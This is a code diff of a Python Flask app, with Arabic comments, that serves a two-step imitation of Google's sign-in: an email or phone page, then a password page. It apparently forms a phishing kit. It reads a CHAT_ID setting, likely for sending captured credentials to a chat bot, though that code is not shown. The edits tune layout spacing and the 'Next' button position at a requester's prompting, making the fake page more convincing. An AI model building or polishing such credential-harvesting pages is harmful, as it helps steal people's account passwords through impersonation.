@@ -12,14 +12,13 @@ CHAT_ID = os.getenv("CHAT_ID")
 GOOGLE_OFFICIAL_URL = "https://accounts.google.com/"
 
 
-# الصفحة الأولى: التحقق من صحة الإيميل أو رقم الهاتف
+# الصفحة الأولى: التحقق من الإيميل/الهاتف مع ضبط مكان "إنشاء حساب" و"التالي"
 @app.route("/", methods=["GET", "POST"])
 def step1():
   error = ""
   if request.method == "POST":
     email_val = request.form.get("email", "").strip()
 
-    # شروط البريد الإلكتروني أو الهاتف
     email_pattern = r"^[\w\.-]+@[\w\.-]+\.\w+$"
     phone_pattern = r"^\+?[0-9]{10,15}$"
 
@@ -115,9 +114,9 @@ def step1():
             display: flex;
             flex-direction: column;
             align-items: flex-start;
-            gap: 10px;
+            gap: 12px;
             padding: 0 2px;
-            margin-top: 4px;
+            margin-top: 6px;
         }
         .links-container a {
             color: #1a73e8;
@@ -133,7 +132,7 @@ def step1():
             display: flex;
             justify-content: flex-end;
             align-items: center;
-            padding-bottom: 60px;
+            padding-bottom: 120px; /* تم رفع زر التالي للأعلى بشكل صحيح بناءً على طلبك */
         }
 
         .submit-btn {
@@ -189,7 +188,7 @@ def step1():
   )
 
 
-# الصفحة الثانية: شرط أن تكون كلمة المرور أطول من 5 أحرف (أكثر من 5)
+# الصفحة الثانية: شرط كلمة المرور أطول من 5 أحرف
 @app.route("/step2", methods=["GET", "POST"])
 def step2():
   user_email = session.get("user_email", "")
@@ -200,7 +199,6 @@ def step2():
   if request.method == "POST":
     password = request.form.get("password", "")
 
-    # شرط أن تكون كلمة المرور أطول من 5 أحرف (أي 6 أحرف فأكثر)
     if len(password) <= 5:
       error = (
           "كلمة المرور قصيرة جداً. يجب أن تكون كلمة المرور أطول من 5 أحرف."
@@ -315,7 +313,7 @@ def step2():
             display: flex;
             justify-content: flex-end;
             align-items: center;
-            padding-bottom: 60px;
+            padding-bottom: 120px;
         }
 
         .submit-btn {
